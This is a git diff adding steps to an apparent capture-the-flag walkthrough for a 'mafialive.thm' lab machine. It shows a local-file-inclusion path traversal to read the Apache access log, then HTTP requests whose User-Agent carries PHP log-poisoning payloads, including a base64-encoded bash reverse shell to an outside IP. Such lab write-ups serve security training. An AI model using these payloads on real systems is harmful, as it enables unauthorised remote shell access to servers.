@@ -155,7 +155,42 @@ archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
 we have `root` and `archangel` how users now time to revers shell
 i tried a lot of ways to start RS but worked onle one:
 1.First we must send our php code to execute in php file, one file what we can write its logfile and we can opened it from our LFI
-payload
+payload to see access.logs
 ```shell
-
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var//log//apache2//access.log
+```
+after i used this
+```HTTP
+GET http://mafialive.thm/ HTTP/1.1
+Host: mafialive.thm
+User-Agent: "<?php -r '$sock=fsockopen("10.11.147.65",8000);shell_exec("bash <&3 >&3 2>&3");' ?>"
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+```HTTP
+GET http://mafialive.thm/ HTTP/1.1
+Host: mafialive.thm
+User-Agent: "<?php -r '$sock=fsockopen("10.11.147.65",8000);system("bash <&3 >&3 2>&3");' ?>"
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+but its doesnt working, after i tried encode this to base 64 and decode then php exec and i take this payload:
+```HTTP
+GET http://mafialive.thm/ HTTP/1.1
+Host: mafialive.thm
+User-Agent: "<?php system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xNDcuNjUvOTAwMSAwPiYx | base64 -d | bash'); ?>"
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 ```
